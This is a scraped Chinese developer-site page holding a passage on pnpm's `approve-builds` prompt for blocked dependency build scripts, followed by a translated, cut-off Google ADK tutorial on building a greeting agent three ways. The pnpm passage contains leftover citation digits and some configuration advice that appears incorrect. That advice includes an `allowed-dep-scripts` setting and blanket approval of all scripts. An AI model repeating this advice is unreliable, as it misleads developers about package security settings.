                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>首次安装依赖或某些依赖的构建脚本被忽略时，pnpm 会拦截这些脚本的自动执行，并提示您运行 <code>pnpm approve-builds</code> 来选择允许哪些包运行脚本。这通常发生在项目依赖中包含可能执行敏感操作的包时</p>
<h3 data-id="heading-0">1. ‌<strong>pnpm 安全机制</strong>‌</h3>
<ul>
<li>‌<strong>默认行为</strong>‌：pnpm 会拦截 <code>postinstall</code> 等敏感脚本，防止自动执行潜在恶意代码3。这导致依赖包的构建脚本（如 <code>core-js</code>、<code>esbuild</code>）被忽略。</li>
<li>‌<strong>触发条件</strong>‌：当安装的依赖包包含构建脚本时，pnpm 会提示需要手动批准23。</li>
</ul>
<h3 data-id="heading-1">2. ‌<strong>差异原因</strong>‌</h3>
<ul>
<li>
<p>‌<strong>环境差异</strong>‌：另一个项目可能未触发此安全机制，原因可能包括：</p>
<ul>
<li>‌<strong>依赖包不同</strong>‌：未包含 <code>core-js</code>、<code>esbuild</code> 等需要构建脚本的依赖2。</li>
<li>‌<strong>pnpm 版本差异</strong>‌：旧版本 pnpm 可能未启用此安全特性2。</li>
<li>‌<strong>配置差异</strong>‌：项目根目录存在 <code>.npmrc</code> 文件，配置了 <code>allowed-dep-scripts</code> 参数允许特定依赖脚本运行45。</li>
<li>‌<strong>CI/CD 环境</strong>‌：CI 环境可能通过环境变量（如 <code>CI=true</code>）或脚本（如 <code>pnpm approve-builds</code>）自动批准构建脚本36。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-2">3. ‌<strong>解决方案</strong>‌</h3>
<ul>
<li>‌<strong>临时允许</strong>‌：在安装命令后添加 <code>--unsafe-perm</code> 参数（不推荐，范围太广）4。</li>
<li>‌<strong>永久配置</strong>‌：在项目根目录创建 <code>.npmrc</code> 文件，添加 <code>allowed-dep-scripts=core-js,esbuild</code>45。</li>
<li>‌<strong>手动批准</strong>‌：运行 <code>pnpm approve-builds</code> 命令，交互式选择允许的依赖（输入 <code>a</code> 允许全部）26。</li>
</ul>
<h3 data-id="heading-3">4. ‌<strong>安全建议</strong>‌</h3>
<ul>
<li>‌<strong>风险评估</strong>‌：确保批准的构建脚本（如 <code>core-js</code>、<code>esbuild</code>）来自可信来源3。</li>
<li>‌<strong>版本更新</strong>‌：检查 pnpm 是否为最新版本，旧版本可能存在安全漏洞2。</li>
</ul>
<h3 data-id="heading-4">解决步骤</h3>
<ol>
<li>
<p>‌<strong>运行命令</strong>‌：在项目根目录下执行以下命令：</p>
<pre><code class="hljs language-css" lang="css">bashCopy <span class="hljs-selector-tag">Code</span>
pnpm approve-builds
</code></pre>
<p>执行后，终端会进入一个交互式界面，列出被忽略的依赖包（例如 <code>core-js</code>、<code>esbuild</code>、<code>@vue-office/docx</code> 等）。‌12</p>
</li>
<li>
<p>‌<strong>选择依赖</strong>‌：</p>
<ul>
<li>‌<strong>允许全部依赖</strong>‌：直接输入 <code>a</code>（代表 all），然后按回车。这是最快捷的方式，适用于您信任所有列出的包。‌24</li>
<li>‌<strong>选择性允许</strong>‌：使用空格键（<code> </code>）勾选特定包，再按回车。例如，如果只信任 <code>core-js</code> 和 <code>esbuild</code>，可勾选它们后确认。‌12</li>
</ul>
</li>
<li>
<p>‌<strong>重新安装并构建</strong>‌：<br/>
完成选择后，重新安装依赖并运行构建：</p>
<pre><code class="hljs language-arduino" lang="arduino">bashCopy Code
pnpm install &amp;&amp; pnpm run build
</code></pre>
<p>被批准的依赖将正常执行脚本，构建应成功。‌‌</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[谷歌ADK实战：3种方法打造AI智能体]]></title>    <link>https://juejin.cn/post/7579871631095939098</link>    <guid>https://juejin.cn/post/7579871631095939098</guid>    <pubDate>2025-12-04T15:04:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579871631095939098" data-draft-id="7579871631095922714" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="谷歌ADK实战：3种方法打造AI智能体"/> <meta itemprop="keywords" content="Python,Go"/> <meta itemprop="datePublished" content="2025-12-04T15:04:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="云云众生s"/> <meta itemprop="url" content="https://juejin.cn/user/380845430158739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            谷歌ADK实战：3种方法打造AI智能体
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/380845430158739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    云云众生s
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T15:04:39.000Z" title="Thu Dec 04 2025 15:04:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Google ADK是构建AI代理的基础框架，支持Python、YAML和可视化构建器三种开发方式，提供灵活性和控制力，可用于创建多代理系统。</p>
<blockquote>
<p>译自：<a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fhow-to-build-ai-agents-3-ways-with-google-adk%2F" target="_blank" title="https://thenewstack.io/how-to-build-ai-agents-3-ways-with-google-adk/" ref="nofollow noopener noreferrer">How To Build AI Agents 3 Ways With Google ADK</a></p>
<p>作者：Janakiram MSV</p>
</blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2F%3Futm_content%3Dinline%2Bmention" target="_blank" title="https://cloud.google.com/?utm_content=inline+mention" ref="nofollow noopener noreferrer">Google</a> 的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogle.github.io%2Fadk-docs%2F" target="_blank" title="https://google.github.io/adk-docs/" ref="nofollow noopener noreferrer">Agent Development Kit</a> (ADK) 已迅速成为构建 AI 代理的基础框架。<a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fgoogles-adk-is-a-new-open-source-framework-for-building-multiagent-systems%2F" target="_blank" title="https://thenewstack.io/googles-adk-is-a-new-open-source-framework-for-building-multiagent-systems/" ref="nofollow noopener noreferrer">在 Google Cloud NEXT 2025 大会上推出</a>后，ADK 在 Google 产品（包括 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2Fgemini-enterprise%3Futm_source%3Dgoogle%26utm_medium%3Dcpc%26utm_campaign%3D1710070-Workspace-DR-APAC-IN-en-Google-BKWS-EXA-Pollux%26utm_content%3Dc-Hybrid%2B%257C%2BBKWS%2B-%2BEXA%2B%257C%2BTxt-Pollux-Generic-435278751514%26utm_term%3Dgemini%2Benterprise%26gclsrc%3Daw.ds%26gad_source%3D1%26gad_campaignid%3D23080541881%26gclid%3DCjwKCAiA55rJBhByEiwAFkY1QGdZPP5s9wkpjdS3nzYfKqlrtfqicVSrvS5P13nnCq3dXyHtXPigwhoC2fkQAvD_BwE%26hl%3Den" target="_blank" title="https://cloud.google.com/gemini-enterprise?utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=1710070-Workspace-DR-APAC-IN-en-Google-BKWS-EXA-Pollux&amp;utm_content=c-Hybrid+%7C+BKWS+-+EXA+%7C+Txt-Pollux-Generic-435278751514&amp;utm_term=gemini+enterprise&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=23080541881&amp;gclid=CjwKCAiA55rJBhByEiwAFkY1QGdZPP5s9wkpjdS3nzYfKqlrtfqicVSrvS5P13nnCq3dXyHtXPigwhoC2fkQAvD_BwE&amp;hl=en" ref="nofollow noopener noreferrer">Gemini 企业版</a> 和 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2Fsolutions%2Fcustomer-engagement-ai%3Fhl%3Den" target="_blank" title="https://cloud.google.com/solutions/customer-engagement-ai?hl=en" ref="nofollow noopener noreferrer">Google 客户互动套件</a>）中为代理提供支持。ADK 对开发人员特别有吸引力的地方在于其灵活性。开发人员可以使用 Python 代码、YAML 配置文件或拖放式可视化界面构建代理——具体取决于工作流偏好和用例要求。</p>
<p>在本教程中，我将引导您通过这三种方法构建您的第一个“Hello World”ADK 代理。最后，您将拥有一个使用每种方法在本地运行的功能性代理，为您选择适合自己项目的方法奠定基础。</p>
<h2 data-id="heading-0">理解三种方法</h2>
<p>在深入实施之前，让我们先了解每种方法提供的功能：</p>
<p><strong>命令式代理 (Python)：</strong> 这种代码优先的方法为您提供了最大的灵活性和控制力。您直接在 Python 中定义代理逻辑、工具和编排，这使其成为需要自定义逻辑、与现有代码库集成或复杂多代理系统的复杂代理的理想选择。Python 方法还通过 LiteLLM 集成支持任何大型语言模型 (LLM)。</p>
<p><strong>声明式代理 (YAML)：</strong> 该方法于 2025 年 8 月随 Agent Config 功能推出，允许您使用 YAML 配置文件定义代理。它减少了样板代码，使代理更易于一目了然地理解——对于更简单的代理或当您希望非开发人员理解代理行为时特别有用。</p>
<p><strong>可视化代理构建器 (GUI)：</strong> Visual Agent Builder 在 ADK v1.18.0 中推出，是一个基于浏览器的 IDE，它结合了可视化工作流设计器、配置面板和 AI 助手。您可以通过拖放交互和自然语言对话设计多代理系统，该工具会在幕后生成正确的 YAML 配置。</p>
<h2 data-id="heading-1">前提条件</h2>
<p>开始之前，请确保您具备以下条件：</p>
<ul>
<li>Python 3.10 或更高版本</li>
<li>代码编辑器</li>
<li>终端访问</li>
<li>Google AI Studio API 密钥或已启用 Vertex AI 的 Google Cloud 项目</li>
</ul>
<h2 data-id="heading-2">步骤 1：设置环境</h2>
<p>首先，创建虚拟环境并安装 ADK。打开您的终端并运行：</p>
<pre><code class="hljs language-bash" lang="bash">python -m venv .venv
<span class="hljs-built_in">source</span> .venv/bin/activate  
</code></pre>
<p>安装 ADK 包：</p>
<pre><code class="hljs">pip install google-adk
</code></pre>
<p>验证安装：</p>
<pre><code class="hljs language-css" lang="css">adk <span class="hljs-attr">--version</span>
</code></pre>
<p>您应该会看到已安装的 ADK 版本（Visual Agent Builder 需要 1.18.0 或更高版本）。</p>
<h2 data-id="heading-3">步骤 2：配置模型访问</h2>
<p>ADK 需要访问 LLM。最简单的入门选项是使用带有免费 API 密钥的 <a href="https://link.juejin.cn?target=https%3A%2F%2Faistudio.google.com%2F" target="_blank" title="https://aistudio.google.com/" ref="nofollow noopener noreferrer">Google AI Studio</a>。从 Google AI Studio 获取您的 API 密钥并保持其可访问性，因为在接下来的步骤中您会用到它。</p>
<h2 data-id="heading-4">方法 1：使用 Python 构建命令式代理</h2>
<p>命令式方法是最强大的方法，通过代码让您完全控制代理行为。让我们构建一个简单的问候代理，演示其核心概念。</p>
<h3 data-id="heading-5"><strong>创建项目结构</strong></h3>
<p>为您的代理项目创建一个新目录：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> hello_agent
<span class="hljs-built_in">cd</span> hello_agent
</code></pre>
<p>在 <code>hello_agent</code> 目录中创建以下文件：</p>
<p><code>__init__.py</code></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> agent
</code></pre>
<p>此文件将目录标记为 Python 包并导入代理模块。</p>
<p><code>agent.py</code></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> google.adk.agents <span class="hljs-keyword">import</span> Agent


<span class="hljs-keyword">def</span> <span class="hljs-title function_">greet_user</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span></span>) -&amp;gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""Greets a user by name.
    
    Args:
        name (str): The name of the user to greet.
        
    Returns:
        dict: A greeting message with status.
    """</span>
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"status"</span>: <span class="hljs-string">"success"</span>,
        <span class="hljs-string">"message"</span>: <span class="hljs-string">f"Hello, <span class="hljs-subst">{name}</span>! Welcome to Google ADK. I'm your first AI agent!"</span>
    }


<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_agent_info</span>() -&amp;gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""Returns information about this agent.
    
    Returns:
        dict: Information about the agent's capabilities.
    """</span>
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"status"</span>: <span class="hljs-string">"success"</span>,
        <span class="hljs-string">"info"</span>: <span class="hljs-string">"I am a Hello World agent built with Google ADK using Python. "</span>
                <span class="hljs-string">"I can greet users and tell them about myself."</span>
    }


root_agent = Agent(
    name=<span class="hljs-string">"hello_agent"</span>,
    model=<span class="hljs-string">"gemini-2.0-flash"</span>,
    description=<span class="hljs-string">"A friendly greeting agent that welcomes users to Google ADK."</span>,
    instruction=<span class="hljs-string">"""You are a friendly and helpful greeting agent. Your primary purpose is to:
    1. Greet users warmly when they provide their name using the greet_user tool
    2. Explain what you are when asked using the get_agent_info tool
    3. Be enthusiastic about introducing users to Google ADK
    
    Always use the available tools to respond appropriately to user requests."""</span>,
    tools=[greet_user, get_agent_info],
)
</code></pre>
<p>Agent 类是 ADK 中的核心构建块。请注意我们如何将工具定义为带有类型提示和文档字符串的普通 Python 函数。ADK 使用这些信息来帮助 LLM 理解何时以及如何调用每个工具。</p>
<p><code>.env</code></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">GOOGLE_GENAI_USE_VERTEXAI</span>=<span class="hljs-number">0</span>
<span class="hljs-attr">GOOGLE_API_KEY</span>=YOUR_API_KEY_HERE
</code></pre>
<p>将占位符值替换为您的实际凭据。</p>
<h3 data-id="heading-6"><strong>运行代理</strong></h3>
<p>导航到您的代理文件夹的父目录：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> ..
</code></pre>
<p>以终端模式运行代理：</p>
<pre><code class="hljs language-arduino" lang="arduino">adk run hello_agent
</code></pre>
<p>您应该会看到一个提示，指示代理正在运行：</p>
<p><code>Running agent hello_agent, type exit to exit.   [user]:   Try these interactions:   [user]: Hello, my name is Jani   [user]: What can you do?   [user]: Tell me about yourself</code></p>
<p>代理将使用适当的工具进行响应。输入 <code>exit</code> 退出。</p>
<h2 data-id="heading-7">方法 2：使用 YAML 构建声明式代理</h2>
<p>使用 YAML 配置文件的声明式方法简化了代理的创建，特别是对于简单的用例。Agent Config 功能生成相同的底层代理结构，但代码更少。</p>
<h3 data-id="heading-8"><strong>创建基于配置的项目</strong></h3>
<p>使用 ADK CLI 生成一个基于配置的代理项目：</p>
<pre><code class="hljs language-ini" lang="ini">adk create yaml_hello_agent <span class="hljs-attr">--type</span>=config
</code></pre>
<p>接受默认值并完成步骤。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcdn.thenewstack.io%2Fmedia%2F2025%2F11%2Fb94370f5-adk-1-0-1024x601.png" target="_blank" title="https://cdn.thenewstack.io/media/2025/11/b94370f5-adk-1-0-1024x601.png" ref="nofollow noopener noreferrer"><img src="https://cdn.thenewstack.io/media/2025/11/b94370f5-adk-1-0-1024x601.png" alt="" loading="lazy"/></a></p>
<h3 data-id="heading-9"><strong>在 YAML 中定义代理</strong></h3>
<p>打开 <code>yaml_hello_agent/root_agent.yaml</code> 并将其内容替换为：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">name:</span> hello_yaml_agent
<span class="hljs-symbol">model:</span> gemini-<span class="hljs-number">2.0</span>-flash
<span class="hljs-symbol">description:</span> A friendly greeting agent built <span class="hljs-keyword">with</span> YAML configuration.
<span class="hljs-symbol">instruction:</span> |
  You are a friendly <span class="hljs-built_in">and</span> helpful greeting agent. Your primary purpose <span class="hljs-built_in">is</span> <span class="hljs-keyword">to</span>:
  <span class="hljs-number">1</span>. Greet users warmly <span class="hljs-keyword">when</span> they provide their name <span class="hljs-keyword">using</span> the greet_user tool
  <span class="hljs-number">2</span>. Explain what you are <span class="hljs-keyword">when</span> asked <span class="hljs-keyword">using</span> the get_agent_info tool
  <span class="hljs-number">3</span>. Be enthusiastic about introducing users <span class="hljs-keyword">to</span> Google ADK
  
  Always use the available tools <span class="hljs-keyword">to</span> respond appropriately <span class="hljs-keyword">to</span> user requests.
<span class="hljs-symbol">tools:</span>
  - name: yaml_hello_agent.greet_user
  - name: yaml_hello_agent.get_agent_info
</code></pre>
<p>YAML 结构镜像了 Python Agent 类的参数，但以更易读的格式呈现。请注意工具是如何通过其模块路径引用的。</p>
<h3 data-id="heading-10"><strong>创建工具模块</strong></h3>
<p>ADK YAML 配置的一个强大功能是您可以混合使用 Python 代码。更新 <code>yaml_hello_agent</code> 文件夹中的 <code>__init__.py</code> 文件：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet_user</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span></span>) -&amp;gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""Greets a user by name.
    
    Args:
        name (str): The name of the user to greet.
        
    Returns:
        dict: A greeting message with status.
    """</span>
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"status"</span>: <span class="hljs-string">"success"</span>,
        <span class="hljs-string">"message"</span>: <span class="hljs-string">f"Hello, <span class="hljs-subst">{name}</span>! Welcome to Google ADK via YAML config!"</span>
    }


<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_agent_info</span>() -&amp;gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""Returns information about this agent.
    
    Returns:
        dict: Information about the agent's capabilities.
    """</span>
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"status"</span>: <span class="hljs-string">"success"</span>, 
        <span class="hljs-string">"info"</span>: <span class="hljs-string">"I am a Hello World agent built with YAML configuration. "</span>
                <span class="hljs-string">"I demonstrate the declarative approach to ADK agents."</span>
    }
</code></pre>
<p>您的项目结构现在应该如下所示：</p>
<pre><code class="hljs language-bash" lang="bash">yaml_hello_agent/  
├── root_agent.yaml  
├── __init__.py  
└── .<span class="hljs-built_in">env</span>
</code></pre>
<h3 data-id="heading-11"><strong>运行基于 YAML 的代理</strong></h3>
<p>导航到父目录并运行：</p>
<pre><code class="hljs language-arduino" lang="arduino">adk run yaml_hello_agent
</code></pre>
<p>使用相同的提示进行测试：</p>
<pre><code class="hljs language-markdown" lang="markdown">[<span class="hljs-symbol">user</span>]: <span class="hljs-link">Hi, I'm Jani</span>
[<span class="hljs-symbol">user</span>]: <span class="hljs-link">What are you?</span>
</code></pre>
<p>代理的响应与 Python 版本相同，但完全通过配置定义。</p>
<h2 data-id="heading-12">方法 3：使用可视化代理构建器构建代理</h2>
<p>Visual Agent Builder 在 ADK v1.18.0 中推出，是一个基于浏览器的 IDE，它改变了您构建代理的方式。它结合了可视化工作流设计器、配置面板和 AI 助手，让您可以通过拖放交互和自然语言对话设计代理。</p>
<h3 data-id="heading-13"><strong>启动可视化代理构建器</strong></h3>
<p>从任何目录运行：</p>
<pre><code class="hljs">adk web
</code></pre>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcdn.thenewstack.io%2Fmedia%2F2025%2F11%2F4c9ef222-adk-1-1-1024x446.png" target="_blank" title="https://cdn.thenewstack.io/media/2025/11/4c9ef222-adk-1-1-1024x446.png" ref="nofollow noopener noreferrer"><img src="https://cdn.thenewstack.io/media/2025/11/4c9ef222-adk-1-1-1024x446.png" alt="" loading="lazy"/></a></p>
<p>在浏览器中打开 <code>http://localhost:8000/dev-ui/</code> 即可访问 Visual Agent Builder。</p>
<p>点击下拉菜单旁边的“+”按钮，输入名称 <code>visual_hello_agent</code>：</p>
